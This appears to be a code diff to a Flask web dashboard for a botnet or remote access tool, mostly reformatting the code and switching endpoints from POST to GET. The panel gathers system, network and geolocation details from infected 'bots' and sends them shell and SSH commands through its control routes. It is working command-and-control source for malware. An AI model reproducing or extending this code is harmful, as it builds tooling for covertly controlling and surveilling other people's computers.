@@ -10,7 +10,7 @@ from lib.server.server import Server
 from flask import Flask, render_template, request, session, jsonify, redirect, url_for
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = urandom(0x200) # cookie encryption
+app.config['SECRET_KEY'] = urandom(0x200)  # cookie encryption
 
 # server
 server = Server()
@@ -23,11 +23,13 @@ bots_signature = None
 
 # -------- Authenticity -------- #
 
+
 def get_bot(bot_id):
     bots = server.interface.bots
     for bot_session in bots:
         if bots[bot_session]['bot_id'] == bot_id:
             return bots[bot_session]
+
 
 def login_required(func):
     def wrapper(*args, **kwargs):
@@ -39,6 +41,7 @@ def login_required(func):
             return func(*args, **kwargs)
     wrapper.__name__ = func.__name__
     return wrapper
+
 
 def bot_required(func):
     def wrapper(*args, **kwargs):
@@ -52,6 +55,7 @@ def bot_required(func):
 
 # -------- Main Pages -------- #
 
+
 @app.route('/')
 def index():
     if not 'logged_in' in session:
@@ -63,6 +67,7 @@ def index():
 
 # -------- Subsections of settings -------- #
 
+
 @app.route('/settings')
 @login_required
 def settings():
@@ -70,9 +75,11 @@ def settings():
 
 # -------- Intel -------- #
 
+
 def start_bot_services(bot_id):
     session['bot_id'] = bot_id
     server.interface.ssh_obj(bot_id)
+
 
 @app.route('/intel')
 @login_required
@@ -96,7 +103,8 @@ def intel_src():
         msg = 'All bots are offline' if all_offline else 'Bot not found'
         return render_template('offline.html', msg=msg)
 
-@app.route('/intel/system/src', methods=['POST'])
+
+@app.route('/intel/system/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_system_src():
@@ -110,6 +118,7 @@ def intel_system_src():
      <div id="display-area"></div>
     '''.format(bot_id)
     return jsonify({'resp': src})
+
 
 def render_system_data(data):
     src = '''
@@ -139,7 +148,8 @@ def render_system_data(data):
     '''.format(hostname, username, os, version)
     return src.format(info)
 
-@app.route('/intel/system/data', methods=['POST'])
+
+@app.route('/intel/system/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_system_data():
@@ -147,7 +157,8 @@ def intel_system_data():
     src = render_system_data(bot['intel']['sys_info']) if bot else ''
     return jsonify({'resp': src})
 
-@app.route('/intel/network/src', methods=['POST'])
+
+@app.route('/intel/network/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_network_src():
@@ -161,6 +172,7 @@ def intel_network_src():
      <div id="display-area"></div>
     '''.format(bot_id)
     return jsonify({'resp': src})
+
 
 def render_network_data(data):
     src = '''
@@ -187,7 +199,8 @@ def render_network_data(data):
     '''.format(isp, in_ip, ex_ip)
     return src.format(info)
 
-@app.route('/intel/network/data', methods=['POST'])
+
+@app.route('/intel/network/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_network_data():
@@ -195,7 +208,8 @@ def intel_network_data():
     src = render_network_data(bot['intel']['net_info']) if bot else ''
     return jsonify({'resp': src})
 
-@app.route('/intel/geo/src', methods=['POST'])
+
+@app.route('/intel/geo/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_geo_src():
@@ -209,6 +223,7 @@ def intel_geo_src():
      <div id="display-area"></div>
     '''.format(bot_id)
     return jsonify({'resp': src})
+
 
 def render_geo_data(data):
     src = '''
@@ -247,7 +262,8 @@ def render_geo_data(data):
     '''.format(country, region, city, zip_code, time_zone, lat, lon)
     return src.format(info)
 
-@app.route('/intel/geo/data', methods=['POST'])
+
+@app.route('/intel/geo/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_geo_data():
@@ -256,6 +272,7 @@ def intel_geo_data():
     return jsonify({'resp': src})
 
 # -------- Controls -------- #
+
 
 @app.route('/control')
 @login_required
@@ -275,7 +292,8 @@ def controls():
         msg = 'All bots are offline' if all_offline else 'Bot not found'
         return render_template('offline.html', msg=msg)
 
-@app.route('/control/cmd/src', methods=['POST'])
+
+@app.route('/control/cmd/src', methods=['GET'])
 @login_required
 @bot_required
 def control_cmd_src():
@@ -300,10 +318,12 @@ def control_cmd_cmd():
         cmd_id = request.form['cmd_id']
         args = request.form.getlist('args[]')
         if all([cmd_id.isdigit(), isinstance(args, list)]):
-            resp = server.interface.execute_cmd_by_id(session['bot_id'], cmd_id, args)
+            resp = server.interface.execute_cmd_by_id(
+                session['bot_id'], cmd_id, args)
     return jsonify({'resp': resp})
 
-@app.route('/control/ssh/src', methods=['POST'])
+
+@app.route('/control/ssh/src', methods=['GET'])
 @login_required
 @bot_required
 def control_ssh_src():
@@ -319,6 +339,7 @@ def control_ssh_src():
     '''.format(bot_id)
     return jsonify({'resp': src})
 
+
 @app.route('/control/ssh/exe', methods=['POST'])
 @login_required
 @bot_required
@@ -331,7 +352,7 @@ def control_ssh_exe():
         else:
             resp = server.interface.ssh_exe(cmd)
             return jsonify({'resp': resp if resp else ''})
-
+            
 def populate_bot_table():
     online_bots = ''
     bots = server.interface.bots
@@ -355,7 +376,8 @@ def populate_bot_table():
         '''.format(bot_id, hostname, '{} {}'.format(os, version), ip, country, bot_id[:8])
     return online_bots
 
-@app.route('/fetch_bots', methods=['POST'])
+
+@app.route('/fetch_bots', methods=['GET'])
 @login_required
 def fetch_bots():
     global bots_signature, bots_online_src
@@ -378,9 +400,10 @@ def fetch_bots():
         bots_online_src = src.format(populate_bot_table())
 
     return jsonify({'resp': src.format('') if not bots_signature else bots_online_src,
-                    'amount': '{:02,}'.format(len(server.interface.bots)), 'status': server.is_active })
+                    'amount': '{:02,}'.format(len(server.interface.bots)), 'status': server.is_active})
 
-@app.route('/online_bots_source', methods=['POST'])
+
+@app.route('/online_bots_source', methods=['GET'])
 @login_required
 def online_bots_source():
     src = '''
@@ -396,7 +419,8 @@ def online_bots_source():
                'ON' if server.is_active else 'OFF', session['last_active'])
     return jsonify({'resp': src})
 
-@app.route('/task_console_source', methods=['POST'])
+
+@app.route('/task_console_source', methods=['GET'])
 @login_required
 def task_console_source():
     src = '''
@@ -407,8 +431,7 @@ def task_console_source():
      <div id="cmd-line"></div>
      <input id="console" placeholder="help" spellcheck="false" type="text" size=64>
      <img src="/static/img/loading.gif" id="console-load">
-     <p id="last_active">last accessed on {}</p>
-    '''.format(session['last_active'])
+    '''
     return jsonify({'resp': src})
 
 @app.route('/task_console_cmd', methods=['POST'])
@@ -422,7 +445,7 @@ def task_console_cmd():
             resp = server.interface.execute_cmd_by_task_id(cmd_id, args)
     return jsonify({'resp': resp})
 
-@app.route('/account_management', methods=['POST'])
+@app.route('/account_management', methods=['GET'])
 @login_required
 def account_management():
     src = '''
@@ -435,7 +458,7 @@ def account_management():
     '''
     return jsonify({'resp': src})
 
-@app.route('/password_update_source', methods=['POST'])
+@app.route('/password_update_source', methods=['GET'])
 @login_required
 def password_update_source():
     src = '''
@@ -457,7 +480,7 @@ def password_update_source():
     '''
     return jsonify({'resp': src})
 
-@app.route('/username_update_source', methods=['POST'])
+@app.route('/username_update_source', methods=['GET'])
 @login_required
 def username_update_source():
     src = '''
@@ -559,7 +582,7 @@ def server_service():
         if failed:server_stop()
     return jsonify({'resp': 'valid', 'mode': mode, 'failed': failed})
 
-@app.route('/server_service_source', methods=['POST'])
+@app.route('/server_service_source', methods=['GET'])
 @login_required
 def server_service_source():
     if all([server.is_active, not session['server_active']]):
@@ -570,14 +593,15 @@ def server_service_source():
 
     src = '''
      <form id="server-address">
-      <input type="text" id="ip" placeholder="127.0.0.1" onkeyup="validateIp(this.value)" maxlength="15" style="margin-top: 5px;">
+      <input type="text" id="ip" placeholder="{}" onkeyup="validateIp(this.value)" maxlength="15" style="margin-top: 5px;">
       <span style="color: #000; font-size: 25px; font-family: rich;">:</span>
-      <input type="text" id="port" placeholder="8080" style="width: 85px;" onkeyup="validatePort(this.value)" maxlength="5">
+      <input type="text" id="port" placeholder="{}" style="width: 85px;" onkeyup="validatePort(this.value)" maxlength="5">
       <hr style="width: 45%; margin: 2.3% auto; margin-top: 5%;">
       <img src="/static/img/load.gif" id="server-service-load" >
       <button type="button" id="server-address-btn" onclick="serverService()">Start Server</button>
      </form>
-    '''
+    '''.format(const.PRIVATE_IP, server.port if server.port else 8080)
+
     return jsonify({'resp': src,
                     'ip': session['ip'] if session['ip'] else '',
                     'port': session['port'] if session['port'] else '', 'mode': 'Stop Server' if session['ip'] else 'Start Server'})
